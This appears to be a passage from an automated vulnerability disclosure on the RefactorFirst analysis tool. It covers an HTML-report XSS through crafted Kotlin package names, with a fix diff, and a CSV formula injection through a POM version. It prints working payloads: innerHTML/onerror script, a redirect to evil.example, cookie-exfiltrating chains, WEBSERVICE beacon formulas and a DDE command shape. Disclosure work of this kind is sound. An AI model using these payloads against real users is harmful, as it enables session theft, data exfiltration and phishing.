':' because the edge/vertex names are recovered from DefaultWeightedEdge.toString () (SimpleHtmlReport.java:1174-1176);
'.' must be avoided so the id-line and label-line copies of the payload stay identical (a diverging copy would throw a
ReferenceError that aborts the const statement); '/' breaks the registration match (converted to '.' in the FQN path);
backtick/newline are excluded by the Kotlin grammar. None of these prevent arbitrary JavaScript: bracket notation
replaces dots, \uXXXX escapes inside JS string literals materialize any character only at runtime, and assignment side
effects replace calls — e.g. the package name
p${document['body']['innerHTML']='<img src=x onerror=alert\u0028document\u0029>'}x executes attacker-controlled JavaScript at page load. No CSP exists anywhere in the report, no name validation exists on the path, and minifyHtml (default false) is a whitespace-level minifier, not a sanitizer. A secondary consequence of the same root cause: a double quote in a Kotlin class name (class-label branch, requires the name to also contain '$
' to reach label emission) or in a package name (package label, unconditional) closes the DOT quoted string and injects
arbitrary DOT node-attribute tokens (label/URL/image/...) into the graph consumed by vizdom (to_svg () output assigned
via innerHTML) and graphlib-dot (popups); unescaped quotes/spaces in unquoted node ids additionally corrupt the DOT
grammar. Whether the injected DOT attributes can escalate to script execution depends on the vizdom WASM renderer and is
not claimed here; the statically certain impact of this breakout class is graph-rendering corruption/DoS plus
attacker-controlled attribute values.

## Attack

Attacker = author of a public repository or PR/fork contributor; victim = a developer or CI pipeline that runs
RefactorFirst on the repository (the tool's documented primary workflow: Maven htmlReport goal or mvn site — both
verified carriers; the CLI defaults to -t HTML but no released CLI jar can start) and anyone who then opens or receives
the generated report. Steps: (1) attacker commits the three crafted .kt files (a realistic shape: a few stray Kotlin
files in an otherwise normal Java project whose own build is unaffected — the POM declares no Kotlin compiler plugin, so
only RefactorFirst parses them); (2) victim clones (or checks out the attacker's PR — the fork-PR checkout delivery is
verified) and runs a default analysis — Kotlin parsing runs unconditionally, the crafted package edge and class cycle
are recorded, and target/site/refactor-first-report.html is generated with the payload embedded in the package-map
script block; (3) any viewer opens the report in a browser (internet access is the designed mode for the report's CDN
charts, though the payload needs none) — the inline const statement evaluates and the injected JavaScript executes in
the report's origin at page load, no click needed. Observable impact: arbitrary script execution — for hosted reports
(the standard CI publishing pattern: Jenkins HTML Publisher / artifact viewers / internal dashboards / hosted mvn site
output — a victim-side publishing step the attacker does not control) a proven session-class compromise of that origin
and every viewer: exfiltration of origin-private data, session ids and cookies via the same-origin ride-along, with the
report body left intact (stealthiest execution shape measured); for local file:// viewing the script still executes but
the impact is bounded (phishing/redirect plus beacon egress with an empty cookie; no session surface, no local-file
disclosure). NOT carriers: the simple report (no graph blocks at all) and the README's GITHUB_STEP_SUMMARY flow (simple
report + GitHub's user-content sanitization strips every script block — measured). The payload rides source text (not
file names), so Linux, macOS and Windows victims are equally exposed. Release status: the Kotlin source channel is
unreleased — no released version (≤ 0.9.0) parses Kotlin sources, so exposure begins with the next release (0.10.0)
unless the package-map sinks are fixed first.

### Payload

A three-file Kotlin repository: (1) a file in a backtick-quoted package whose name embeds a dot/paren/colon/slash-free
JS expression in a ${...} block, e.g. the package directive "package
`p${document['body']['innerHTML']='<img src=x onerror=alert\u0028document\u0029>'}x`" containing "import q.Helper" and "class Evil (val helper: Helper)" — the cross-package reference creates the package edge; (2)+ (3) a normal package q with two mutually-referencing classes (e.g. Helper and Cycle2 referencing each other's types) — the 2-class cycle makes the report render the full page including the package map. The report then contains "const packageGraph_dot =
`strict digraph G { p${...}x -> q ...; p${...}x [label=\"p${...}x\"]; q [label=\"q\"]; }`;" inside an inline script block: the substitution expression runs when the page's scripts are first evaluated, injecting a live img/onerror element via innerHTML (the parentheses for the call arrive only at runtime through the \u0028/\u0029 escapes inside the JS string literal). A minimal variant is the package "p$
{location='\u002f\u002fevil\u002eexample\u002f'}x" which navigates the report tab to an attacker site. The
impact-assessment round (EXP-R6-E8) additionally proved a stealthier business-impact shape: the package name px$
{document['head']['innerHTML']+='<img src=x onerror="CHAIN">'}z appends an invisible <img> to the completed <head>
(report body stays fully intact; the re-created element multiplies the chain 6x per page load across the three
occurrences) whose CHAIN — built entirely from \uXXXX escapes, bracket notation and string re-parsing — beacons the
viewer's cookie, performs an authenticated same-origin fetch with the viewer's session and exfiltrates the response.

## Data flow

### Step 1 —

`dependency: org/jetbrains/kotlin/lexer/Kotlin.flex:101-102,315 (kotlin-compiler-embeddable 2.4.10, pinned by rewrite-kotlin 8.90.4)`

Source: a backtick-quoted Kotlin identifier lexes as ONE IDENTIFIER token containing any characters except backtick and
newline (ESCAPED_IDENTIFIER rule) — quotes, '$', '{', '}' are legal content; a backticked package directive parses
without diagnostics.

### Step 2 —

`dependency: org/openrewrite/kotlin/internal/KotlinTreeParserVisitor.java:2897-2908, 3833-3851 (rewrite-kotlin 8.90.4)`

visitPackageDirective builds J.Package from the directive's name expressions; createIdentifier strips exactly the outer
backticks and stores the inner text verbatim as the J.Identifier simple name — the raw payload (with '${', '"', etc.)
becomes the package expression's name.

### Step 3 —

`dependency: org/openrewrite/java/tree/J.java:5005-5011 + J.java:1672-1674 + org/openrewrite/java/JavaPrinter.java:711-718 (rewrite-java 8.90.4)`

J.Package.getPackageName () prints the expression via a synthetic cursor rooted at a J.CompilationUnit, whose printer ()
is the generic JavaPrinter; JavaPrinter.visitIdentifier appends the raw simpleName and ignores rewrite-kotlin's Quoted
marker — getPackageName () returns the raw package text (no backticks, no escaping). This is decisive: backticks would
otherwise break the step-7 registration match.

### Step 4 —

`dependency: org/openrewrite/kotlin/KotlinTypeSignatureBuilder.kt:712-731 + org/jetbrains/kotlin/name/ClassId.kt:84-103`

The FIR-attributed class FQN is convertClassIdToFqn (classId): ClassId.asString () joins package (dots→'/') + class name
with no charset validation, and convertKotlinFqToJavaFq applies only
'.'→'$', '/'→'.', '?'-strip — for a dot-free package the class FQN is p${payload}x.Evil verbatim.

### Step 5 —

`codebase-graph-builder/src/main/java/org/hjug/graphbuilder/visitor/KotlinDependencyVisitor.java:64-67, 99-118`

visitCompilationUnit registers the raw package name (registerPackage (getPackageName ())) and the class vertex
(type.getFullyQualifiedName (); the un-attributed fallback pkg + '.' + simpleName at :110-118 is equally raw and skips
the identifier validation used by the Java-side fallback).

### Step 6 —

`codebase-graph-builder/src/main/java/org/hjug/graphbuilder/visitor/BaseTypeProcessor.java:28-33 + GraphDependencyCollector.java:79-114`

A cross-package type reference (property/parameter of type q.Helper in the same parse batch, FIR-attributed) records
addClassDependency (
'p${payload}x.Evil', 'q.Helper') → addPackageDependency → getPackageFromFqn (text before last dot) adds package vertices p$
{payload}x and q plus the edge between them.

### Step 7 —

`codebase-graph-builder/src/main/java/org/hjug/graphbuilder/graphbuilder/JavaSourceFileGraphBuilder.java:120-150 (finalizeDto/removePackagesNotInCodebase)`

Prune check passes: the vertex survives because the registered name (print-based, step 3) and the FQN-derived name
(steps 4-6) are identical for payloads without '/' (a '/' would be converted to '.' by the FQN path and mismatch the
registration — the check is a membership test against declared packages, not a charset validation).

### Step 8 — `report/src/main/java/org/hjug/refactorfirst/report/HtmlReport.java:962-991, 995-1017`

renderPackageGraphVisuals runs whenever a package edge exists; buildPackageGraphDot wraps the DOT as a JS template
literal (`strict digraph G { ... }`; backtick-quoted).

### Step 9 — `report/src/main/java/org/hjug/refactorfirst/report/HtmlReport.java:1019-1047, 1049-1065`

Sink (payload emission): renderPackageGraphEdge writes edge endpoint ids as replace (".", "_") ONLY (no
'$' handling, :1031-1032) and renderPackageVertices writes the node id as replace (".", "_") (:1054) and the label as label="<raw packageName>" (:1056-1058) — the ${...}
payload lands unescaped in the DOT text; renderSafeNodeId's '$'→'_' and the class-label branch's '$'→'\$' exist for
classes but were never applied to the package branches.

### Step 10 —

`report/src/main/java/org/hjug/refactorfirst/report/HtmlReport.java:512-521 (generateGraphButtons) + SimpleHtmlReport.java:390, 355-371`

The DOT is emitted as an inline script block "const packageGraph_dot = <dot>;" — a classic non-module script executed at
page load: every ${...} substitution evaluates during initial script evaluation (zero interaction; dotGraphThreshold
=4000 gates only the vizdom div at :985). Rendering of the section requires the hasAnyDisharmony gate to pass, which any
2-class cycle in a normal package satisfies; no metric thresholds are needed.

### Step 11 —

`report/src/main/java/org/hjug/refactorfirst/report/SimpleHtmlReport.java:1174-1176 (extractVertexes) + HtmlReport.java:383-407 (report head)`

Residual constraints and downstream: extractVertexes recovers edge/vertex names from DefaultWeightedEdge.toString () and
strips '(' / ')' and splits on ':', so the payload avoids those characters plus '.', '/', backtick and newline —
insufficient, because bracket notation, \uXXXX string escapes and assignment side effects yield arbitrary JavaScript
(e.g. p${document['body']['innerHTML']='<img src=x onerror=alert\u0028document\u0029>'}x). The report head defines no
CSP and loads seven CDN scripts, so online viewing (the designed mode) exposes a full web origin; the report writer
emits the bytes verbatim.

## Fix / patch notes

diff --git a/report/src/main/java/org/hjug/refactorfirst/report/HtmlReport.java
b/report/src/main/java/org/hjug/refactorfirst/report/HtmlReport.java ---
a/report/src/main/java/org/hjug/refactorfirst/report/HtmlReport.java +++
b/report/src/main/java/org/hjug/refactorfirst/report/HtmlReport.java @@ -1028,8 +1028,8 @@ public class HtmlReport
extends SimpleHtmlReport { // render edge String[] vertexes = extractVertexes (edge);

- String start = vertexes[0].trim ().replace (".", "_");
- String end = vertexes[1].trim ().replace (".", "_");

+ String start = renderSafePackageNodeId (vertexes[0].trim ());
+ String end = renderSafePackageNodeId (vertexes[1].trim ());

  log.debug ("Rendering edge: {} -> {}", start, end); dot.append (start); @@ -1049,11 +1049,11 @@ public class
  HtmlReport extends SimpleHtmlReport { StringBuilder dot) { for (String packageName : vertexesToRender) {

-        dot.append(packageName.replace(".", "_"));

+        dot.append(renderSafePackageNodeId(packageName));

         dot.append(" [label=\"");

-        dot.append(packageName);

+        dot.append(escapeDotQuoted(packageName));
         dot.append("\"");

         if (packagesToRemove.contains(packageName)) {

@@ -1064,6 +1064,30 @@ public class HtmlReport extends SimpleHtmlReport { dot.append ("];\n"); } }

+
+ /**
+     * DOT-safe node id for a package vertex. Neutralizes every DOT-grammar and
+     * JS-template-literal metacharacter that analyzed-repo package names may legally
+     * contain (Kotlin backtick-quoted identifiers allow anything but backtick/newline),
+     * mirroring the class-node id treatment of renderSafeNodeId(String).
+     */
+ static String renderSafePackageNodeId (String packageName) {
+        return packageName.replace(".", "_")
+                .replace("$", "_")
+                .replace("\"", "_")
+                .replace("{", "_")
+                .replace("}", "_");
+ }
+
+ /**
+     * Escapes a value for a DOT double-quoted string that is additionally embedded in a
+     * JavaScript template literal (generateGraphButtons): backslash and double quote for
+     * the DOT grammar, '$' so a '${' sequence cannot start a JS interpolation.
+     */
+ static String escapeDotQuoted (String value) {
+        return value.replace("\\", "\\\\").replace("\"", "\\\"").replace("$", "\\$");
+ }

@@ -603,10 +603,10 @@ public class HtmlReport extends SimpleHtmlReport { dot.append (hyperlinkClassForDot (vertex,
repoUrl, codebaseGraphDTO)); if (className.contains ("$")) {

-            dot.append(" label=\"").append(className.replace("$", "\\$")).append("\"");

+            dot.append(" label=\"").append(escapeDotQuoted(className)).append("\"");
         } else if (isAnonymousFqn(vertex)) {
             // Kotlin "<anonymous>" renders under the enclosing source file's base name as the
             // owner with $ as the enclosing-class separator (escaped for DOT).
             dot.append(" label=\"")

-                    .append(anonymousOwnerLabel(vertex, codebaseGraphDTO).replace("$", "\\$"))

+                    .append(escapeDotQuoted(anonymousOwnerLabel(vertex, codebaseGraphDTO)))
                     .append("\"");
         }

## References

- https://cwe.mitre.org/data/definitions/79.html
- https://cwe.mitre.org/data/definitions/74.html
- https://owasp.org/www-community/attacks/xss/
- https://kotlinlang.org/docs/reference/grammar.html
- https://cheatsheetseries.owasp.org/cheatsheets/Cross_Site_Scripting_Prevention_Cheat_Sheet.html

---

_Rendered from original VulnHunter / VulnForge `report.yaml` by OpenVuln._

## [medium] CSV report generator (report/CsvReport.java) writes the analyzed repository's POM <version>/<name> unescaped into its CSV records — CSV formula injection (CWE-1236) executes in the analyst's spreadsheet: SSRF/beacon/data exfiltration, phishing links, prompt-gated DDE command execution. Dynamic POC (R2): payload verified verbatim as cell #1 of every data row on released 0.8.0 (LibreOffice imports those cells as FORMULA), while on the audited snapshot the data-row loop is crash-blocked by an unrelated PMD message-format regression (GodClass NPE before any write) and the reachable no-git / no-god-classes fallback rows carry the injection through both entry points up to a WEBSERVICE outbound request in LibreOffice

- key: `BUG-R2-S2-A3-H1`
- disclosure: owner_only
- cwe: CWE-1236
- file: `../report/src/main/java/org/hjug/refactorfirst/report/CsvReport.java`

# CSV report generator (report/CsvReport.java) writes the analyzed repository's POM <version>/<name> unescaped into its CSV records — CSV formula injection (CWE-1236) executes in the analyst's spreadsheet: SSRF/beacon/data exfiltration, phishing links, prompt-gated DDE command execution. Dynamic POC (R2): payload verified verbatim as cell #1 of every data row on released 0.8.0 (LibreOffice imports those cells as FORMULA), while on the audited snapshot the data-row loop is crash-blocked by an unrelated PMD message-format regression (GodClass NPE before any write) and the reachable no-git / no-god-classes fallback rows carry the injection through both entry points up to a WEBSERVICE outbound request in LibreOffice

- **Project:** refactorfirst/RefactorFirst
- **Finding key:** BUG-R2-S2-A3-H1
- **CWE:** CWE-1236
- **CVSS:** 6.1 (`CVSS:3.1/AV:N/AC:L/PR:N/UI:R/S:C/C:L/I:L/A:N`)
- **EV priority:** P1
- **EV score:** 6
- **PoC status:** reproduced
- **EXP status:** confirmed
- **Affected versions:** confirmed in source at 0.10.0-SNAPSHOT (commit 65d3bef). The csvreport mojo and the CLI
  `-t CSV` report type with CsvReport's raw `append(projectVersion)` row assembly predate the audited snapshot (README
  documents the released 0.9.0 plugin); released 0.x versions carrying the same report module are very likely affected;
  exact introduction commit not verified against release tags. Dynamic note (POC R2): the every-data-row sink was
  reproduced verbatim on the released 0.8.0 artifact (payload as cell #1 of every row, LibreOffice imports them as
  FORMULA; 0.6.2 also uses the working positional GodClass parse). On the audited snapshot (pmd-java 7.0.0-rc4 pinned by
  the root pom; same for released 0.9.0) any analyzed repo with a real GodClass violation crashes the CSV report with an
  NPE before any output (the legacy "ATFD=…, WMC=…, TCC=…" regex in org.hjug.metrics.GodClass never matches PMD 7's
  "Possible God Class (WMC=…, ATFD=…, TCC=…%)" message), so the data-row loop is dead code there; the fallback-row
  injection (no-git / no-god-classes paths) reproduces fully on this snapshot through both entry points. Full
  reproduction record: findings/BUG-R2-S2-A3-H1/poc/poc.md.

## Exploitability rationale

R:L — the attacker must occupy the role of "author of the repository the victim chooses to analyze" (file-control class,
no credentials or network position needed); the malicious repo is delivered remotely (hosted clone URL, archive, PR),
but the victim must run the report command and the report consumer must open the CSV — inherent user interaction, same
grade as the HTML-report findings on this source. E:C — CSV is a first-class report type (registered `csvreport` Maven
goal, CLI `-t CSV` completion candidate) rather than an experimental feature, and in the Maven entry the analyzed POM
itself binds the goal to any lifecycle phase (dynamically verified in R6/E10: `<build><executions>` bindings made the
payload CSV appear inside a routine `mvn verify` and `mvn site` run, BUILD SUCCESS), so the attacker controls whether
the vulnerable report path runs during the victim's routine command; the CLI persona is version-bounded (released CLI
0.7.0-0.9.0 all crash at startup with a pre-existing picocli duplicate-`--output` bug, verified per release; CLI
delivery reproduced only on <=0.6.2); not E:D because the CLI default report type is HTML and the CI persona still
requires the victim to build third-party code. C:D — pure deterministic string propagation: no quoting, encoding or
validation touches the value on the whole path, so a crafted `<version>` is embedded verbatim into the output file every
time; the only variance is which payload spellings survive the output-filename constraint on a given generation
platform, and cross-platform CHAR ()-constructed forms exist. Dynamic POC results (R2): on the released 0.8.0 artifact
the primary claim was verified verbatim — the canonical CHAR ()-constructed WEBSERVICE payload landed as cell #1 of
every data row (2 god classes → 2 rows), unquoted and unneutralized, and LibreOffice 7.4.7.2 imported those cells as
FORMULA (control run with a plain version yields TEXT cells). On the audited snapshot the per-data-row loop
(CsvReport.java:121) never executes — any analyzed repo with a real GodClass violation crashes the report earlier with
an NPE (PMD 7.0.0-rc4 renders "Possible God Class (WMC=…, ATFD=…, TCC=…%)" while the legacy GodClass regex expects
"ATFD=…, WMC=…, TCC=…", so wmc==null and GodClassRanker.rankWmc throws before any CSV is written) — and the injection
instead lands verbatim in the reachable no-git / no-god-classes fallback rows, where an XML-embedded newline (guarded by
sentinel characters, because MavenXpp3Reader and Maven's model reading trim leading/trailing whitespace of name/version
but keep embedded newlines) puts the payload at a line start as a complete, self-contained CSV record — reproduced
byte-for-byte through both the CLI and Maven entries. I:S — successful exploitation yields an attacker-directed outbound
HTTP request from the machine that opens the report (WEBSERVICE: SSRF/beacon/exfiltration of INFO ()-style environment
data), phishing-grade HYPERLINK content inside a trusted analysis artifact, and DDE-command execution in the analyst's
user context as the upper bound on older/permissively configured Office installs (current default Office builds gate DDE
behind explicit security prompts and Protected View gates downloaded files behind an "Enable Editing" click) —
significant impact on a different machine/trust domain than the one that generated the report, but not guaranteed
zero-click code execution. Dynamic evidence (R2, LibreOffice 7.4.7.2): the injected records import as FORMULA cells
(never text); =1+1 evaluates to 2 and HYPERLINK displays the attacker-chosen URL on plain open; the exact payload
formulas, evaluated in the same LibreOffice instance, issued OPTIONS/HEAD/GET requests to the (sandbox-local stand-in)
attacker URL and the cell then held the attacker-controlled response body; for freshly imported CSVs LibreOffice 7.4.7.2
hard-gates the fetch behind its load-time external-content hardening — Err:540 on a pristine default profile, under
UpdateDocMode=FULL_UPDATE, and with the profile link-update setting at Never/On request/Always (every headless lever
tried, R6/E10; the fetch completes only when the formula is evaluated outside the imported-CSV document context) — while
Excel — the primary consumer named here — evaluates WEBSERVICE on open/recalc without that gate (the classic
CSV-injection exfiltration primitive; documented, not dynamically testable in this Linux-only sandbox;
browser-downloaded artifacts additionally need one Enable-Editing click under Protected View/MotW, which CI-tooling
downloads and locally generated reports avoid). Real-scenario verification (R6/E10 CI simulation,
findings/BUG-R2-S2-A3-H1/exp/): the exact artifact formulas — produced by the victim's routine `mvn verify`/`mvn site`
over the attacker POM, packaged as a build artifact and downloaded — were evaluated in a fetch-enabled context and
issued the outbound OPTIONS/HEAD/GET with INFO ()/CELL ()-derived environment data (document path, OS) inside the
request URL, taking the attacker-controlled response body as the cell's displayed value (stage-2 content injected into
the trusted report); a pure-CHAR () spelling with a default-port URL kept the whole chain legal on every generation
platform. The universal floor on every mainstream consumer is live-formula import plus HYPERLINK/phishing-content
rendering; the outbound tier is Excel-conditional.

## Code anchors

| File                                                                                              | Line | Function                         |
|---------------------------------------------------------------------------------------------------|-----:|----------------------------------|
| `../report/src/main/java/org/hjug/refactorfirst/report/CsvReport.java`                               |  121 | `execute`                        |
| `../report/src/main/java/org/hjug/refactorfirst/report/CsvReport.java`                               |   24 | `execute`                        |
| `../report/src/main/java/org/hjug/refactorfirst/report/CsvReport.java`                               |  208 | `addsRow`                        |
| `../report/src/main/java/org/hjug/refactorfirst/report/CsvReport.java`                               |   88 | `execute`                        |
| `../report/src/main/java/org/hjug/refactorfirst/report/CsvReport.java`                               |   63 | `execute`                        |
| `../report/src/main/java/org/hjug/refactorfirst/report/CsvReport.java`                               |  100 | `execute`                        |
| `../report/src/main/java/org/hjug/refactorfirst/report/ReportWriter.java`                            |   26 | `writeReportToDisk`              |
| `../cli/src/main/java/org/hjug/refactorfirst/ReportCommand.java`                                     |  128 | `call`                           |
| `../cli/src/main/java/org/hjug/refactorfirst/ReportCommand.java`                                     |  159 | `inferArgumentsFromMavenProject` |
| `../refactor-first-maven-plugin/src/main/java/org/hjug/mavenreport/RefactorFirstMavenCsvReport.java` |   27 | `execute`                        |
| `../cost-benefit-calculator/src/main/java/org/hjug/cbc/CostBenefitCalculator.java`                   |  208 | `getGodClasses`                  |
| `../cost-benefit-calculator/src/main/java/org/hjug/cbc/CostBenefitCalculator.java`                   |   78 | `loadRules`                      |

## Background

RefactorFirst is a static-analysis tool for Java/Kotlin codebases: a developer or CI job runs it against a codebase
(sources + .git history + build files) and it emits prioritized refactoring findings. Besides the HTML reports it
supports a CSV report — produced by the `csvreport` Maven goal (`RefactorFirstMavenCsvReport`) and by the CLI's `-t CSV`
option (`ReportCommand` → `CsvReport`) — whose explicit purpose is spreadsheet consumption: it writes a dated,
human-readable deliverable `RefFirst_P<projectName>_PV<projectVersion>_PD<date>.csv` into `target/site/` (Maven) or the
working directory (CLI). The report carries the analyzed project's identity (name/version from its `../pom.xml`) plus one
row per detected God class. The security-relevant trust boundary is "analyzed repository → report → whoever opens the
report": the tool's own documentation tells users to point it at arbitrary projects ("This command will analyze Maven
and non-Maven projects", and it even invites adding a dummy POM "to show your project's name in the report"), so the
analyzed POM's text — including `<name>`/`<version>` — is routinely third-party content, while the generated CSV is
opened in Excel/LibreOffice/Google Sheets by an analyst. A CSV cell whose first character is `=`, `+`, `-` or `@` is
parsed as a formula by those applications on open; embedding untrusted values into such cells is the classic CSV/formula
injection class (CWE-1236, OWASP "CSV Injection"), the same defect class gitleaks fixed in its CSV reporter (PR #2237).

## Description

The analyzed repository's `<version>` (and `<name>` in the two fallback message paths) — free-form XML text fully
controlled by the analyzed project's author — flows into cell #1 of every data row of the generated CSV with no
validation, no encoding, no CSV quoting and no formula-trigger neutralization at any point. Sources (both entry points):
(1) Maven — `RefactorFirstMavenCsvReport` declares `@Parameter(defaultValue = "${project.version}")`/`${project.name}`,
so running the `csvreport` goal inside the analyzed project (bound by that project's POM to `mvn site`, or invoked
directly) interpolates the analyzed POM's values verbatim; Maven 3 model validation imposes no charset/format constraint
on `<version>` (versions are free-form strings; only unresolved `${...}` expressions are flagged, which the payload
avoids). (2) CLI — `ReportCommand.inferArgumentsFromMavenProject()` silently parses the analyzed `../pom.xml` with
`MavenXpp3Reader` (a pure XML→Model deserializer: no model building, no interpolation, no validation) and takes
`project.getVersion()`/`project.getName()` raw whenever the optional `-p`/`-v` flags are unset, i.e. on the default
invocation; the CLI only parses the POM as data, it does not execute the analyzed build. Sink: `CsvReport.execute()`
assembles the report with a raw StringBuilder. After the header row, every data row starts with
`contentBuilder.append(projectVersion).append(",")` — the version is the "Ver" column, i.e. cell #1 of every row, and
each row begins at a true line start (the previous row ends with an appended "\n"). A leading `=`/`+`/`-`/`@` therefore
sits exactly at a cell boundary, which is the condition spreadsheet applications use to evaluate a cell as a formula.
The remaining cells are appended by `addsRow()`, a bare `append(value).append(",")` loop — no field is ever quoted or
escaped (structurally weaker than gitleaks' Go encoding/csv, which at least quotes structural characters). The fallback
paths embed the same values mid-line ("No Git repository found in project <name> <version>.",
"Congratulations! <name> <version> has no God classes!"); an XML-embedded newline in the value moves a formula to a line
start there too. The assembled string is written verbatim to disk by `ReportWriter.writeReportToDisk`. The data-row
path's preconditions are all attacker-arrangeable: the analyzed directory must be a git repository root (any clone
satisfies this), and PMD must flag at least one God class — `runPmdAnalysis()` runs the built-in
`category/java/design.xml` ruleset of the pinned pmd-java 7.0.0-rc4 over every file, and the GodClass rule's
WMC/ATFD/TCC thresholds are trivially exceeded by an authored bloated class committed once. The only structural
constraint is that the same version string is also concatenated into the output file name
(`RefFirst_P…_PV<version>_PD<date>.csv`): a `/` in it makes `ReportWriter.createNewFile()` throw IOException, which is
swallowed and logged, so no file is produced at all. This prunes specific payload spellings (and silently fails with no
user warning) but not the class: `=WEBSERVICE(CHAR(104)&CHAR(58)&CHAR(47)…)` uses only `=`, `(`, `)`, `&`, letters and
digits — legal in Windows/NTFS, Linux and macOS file names alike — needs no comma (`&` is Excel's concatenation
operator, so it survives the quote-less cell intact), and rebuilds `http://` at evaluation time via CHAR (47). DDE
shapes (`=cmd|'c:\windows\…'!A1`, needing only `| ' \ :`) are file-name-legal on the Linux/macOS hosts that commonly
generate the report in CI. No mitigating control exists in the project: no CSV-aware writer, no formula neutralization,
no validation of POM-derived values; the only escape helper in the module (`SimpleHtmlReport.escapeHtmlLabel`) is
HTML-specific and never invoked by `CsvReport`. Consumer-side hardening shapes the impact tier per consumer (verified
matrix, R6/E10): Excel Mark-of-the-Web/Protected View adds one Enable-Editing click for browser-downloaded artifacts
(CI-tooling downloads and locally generated reports carry no MotW), DDE is prompt-gated/disabled by default since
ADV170021, and LibreOffice 7.4.7.2 hard-gates the WEBSERVICE fetch for freshly imported CSVs (Err:540 on a pristine
default profile, under UpdateDocMode=FULL_UPDATE, and with link-update settings Never/On request/Always; the fetch
completes only outside the imported-document context). The reliable floor on every mainstream consumer is live-formula
import + HYPERLINK/phishing-content rendering inside the trusted report (zero clicks); the outbound WEBSERVICE request
tier (beacon, INFO ()/CELL () exfiltration, intranet request, stage-2 content delivery) is Excel-conditional —
zero-click there except for the MotW-gated one-click case. CVSS v3.1 derivation: AV:N (the malicious POM is delivered
from a network-hosted repository; no local access needed), AC:L (deterministic string propagation, no special
conditions), PR:N, UI:R (victim runs the report command; the consumer opens the CSV — the artifact's documented
purpose), S:C (the vulnerability is in the report generator, the impact lands in the spreadsheet application/security
domain of whoever opens the report), C:L/I:L (attacker-directed outbound request from the consumer's machine revealing
environment data; phishing-grade content inside a trusted artifact; DDE command execution possible but gated by explicit
security prompts on current default Office builds — not counted as guaranteed host compromise), A:N.

## Attack

Attacker persona: the author/host of a third-party repository (or PR) that a victim analyzes. Two realistic deliveries:
(a) CI — the repository's POM binds `org.hjug.refactorfirst:refactor-first-maven-plugin`'s `csvreport` goal to any
lifecycle phase; a CI job that runs `mvn verify` / `mvn site` (or the goal directly) on cloned/third-party code
(verified end-to-end in the R6/E10 CI simulation for both commands, on the audited snapshot and on released 0.8.0)
produces `target/site/RefFirst_P…_PV<payload>_PD<date>.csv` as a build artifact; the artifact escapes the build sandbox
and is downloaded and opened in Excel by an analyst who never ran any of the repository's code. (b) Local — a developer
runs the standalone CLI (`java -jar cli.jar -t CSV`) at the root of the cloned repo (verified on released CLI 0.6.2;
every released CLI from 0.7.0 to 0.9.0 crashes at startup with a pre-existing picocli bug, bounding this persona to the
old artifacts still on Maven Central); the CLI merely *parses* the attacker's `../pom.xml` (MavenXpp3Reader) and writes the
CSV into the working directory; the developer opens it in their spreadsheet application. On open, the first cell of each
data row is parsed as a formula: WEBSERVICE issues an outbound HTTP request from the consumer's machine to an
attacker-chosen URL at import time in Excel (documented; capability-proven on the LibreOffice engine in a fetch-enabled
context, R6/E10) — beacon/SSRF, exfiltration of INFO ()/CELL ()-style environment values, retrieval of further
instructions — while LibreOffice 7.4.7.2 plain-open keeps it gated at Err:540; HYPERLINK renders an attacker-chosen URL
as clickable content inside the trusted report on every consumer (credential phishing), and DDE shapes (`=cmd|…!A1`)
attempt OS command execution in the analyst's user context, gated by Excel's security prompts on current default Office
builds (older or permissively configured installs execute after the user accepts the standard warning). The generating
process itself executes nothing — the harm lands one consumer downstream, on the machine that opens the report.

### Payload

A malicious analyzed repository consisting of: (1) a `../pom.xml` whose `<version>` is a comma-free, slash-free formula
payload, e.g. `<version>=WEBSERVICE(CHAR(104)&amp;CHAR(58)&amp;CHAR(47)&amp;CHAR(47)&amp;CHAR(101)&amp;…)</version>`
(XML entity form for `&` keeps the POM well-formed; the parser decodes it to the raw `&`-concatenation). The payload
uses only `= ( ) &` plus letters/digits, so it is a legal file name on every platform (the same string is embedded in
the output file name) and needs no comma, so it survives the unquoted CSV cell intact. For generation on Linux/macOS,
DDE spellings such as `=cmd|'c:\windows\system32\<tool>.exe'!A1` are additionally available. (2) one bloated `.java`
file (many branching methods, many foreign-data accesses, low cohesion) that trips PMD's GodClass rule, committed once
so it has git history; (3) a `.git` directory (any clone). Variants: `<name>` or `<version>` containing an embedded
newline + formula targets the "No Git repository found…"/"Congratulations!…" fallback rows (file names with newlines are
legal on Linux/macOS). Dynamic POC refinement (R2): because MavenXpp3Reader (CLI) and Maven's model reading (mojo) TRIM
leading/trailing whitespace of `<name>`/`<version>` while keeping embedded newlines, the working spelling wraps the
formula in sentinel characters, e.g. `<version>x&#10;=WEBSERVICE("http:"&amp;CHAR(47)&amp;…&#10;x</version>` — this
makes the formula a complete, self-contained CSV record at a line start while keeping the value trim-safe, and it is the
form verified end-to-end on both entry points (on the audited snapshot the GodClass-based data rows never render — see
the NPE note — so the fallback rows are the verified carrier). Delivery boundaries measured in R6/E10
(findings/BUG-R2-S2-A3-H1/exp/): the Maven-goal delivery was reproduced end-to-end through a CI simulation on the
audited snapshot (fallback-row carrier via `mvn verify` and `mvn site`, the goal bound by the attacker POM's
`<build><executions>`) and on released 0.8.0 (data-row carrier, incl. a pure-CHAR () spelling with an NTFS-legal output
file name whose URL fetches on the default port); the CLI persona is bounded to released <=0.6.2 — every released CLI
from 0.7.0 through 0.9.0 crashes at startup with a pre-existing picocli DuplicateOptionAnnotationsException (duplicate
`--output` on `-tsd` and `-o`), verified per release, so "developer runs the CLI on a cloned repo" is only a live
scenario on the old artifacts still on Maven Central.

## Data flow

### Step 1 — `refactor-first-maven-plugin/src/main/java/org/hjug/mavenreport/RefactorFirstMavenCsvReport.java:24-28`

Maven entry: `@Parameter(defaultValue = "${project.name}")` and `@Parameter(defaultValue = "${project.version}")` bind
the analyzed project's POM values; when the csvreport goal runs inside the analyzed repository (bound by that
repository's own POM to mvn site, or invoked directly) these are the attacker-authored strings, passed verbatim to
CsvReport.execute () at :39-47.

### Step 2 — `cli/src/main/java/org/hjug/refactorfirst/ReportCommand.java:146-176`

CLI entry: with -p/-v unset (default), inferArgumentsFromMavenProject () reads the analyzed pom.xml via
MavenXpp3Reader.read () (:156-159) — pure XML→Model parse with no model building, interpolation or validation — and
assigns projectVersion = project.getVersion () (:172, name at :169); populateDefaultArguments () (:137-144) substitutes
only null/empty values, so the crafted value survives.

### Step 3 — `cli/src/main/java/org/hjug/refactorfirst/ReportCommand.java:128-131`

`-t CSV` dispatch: case CSV → new CsvReport ().execute (showDetails, projectName, projectVersion, outputDirectory,
baseDir) — the raw value crosses into the report module.

### Step 4 — `report/src/main/java/org/hjug/refactorfirst/report/CsvReport.java:24-33`

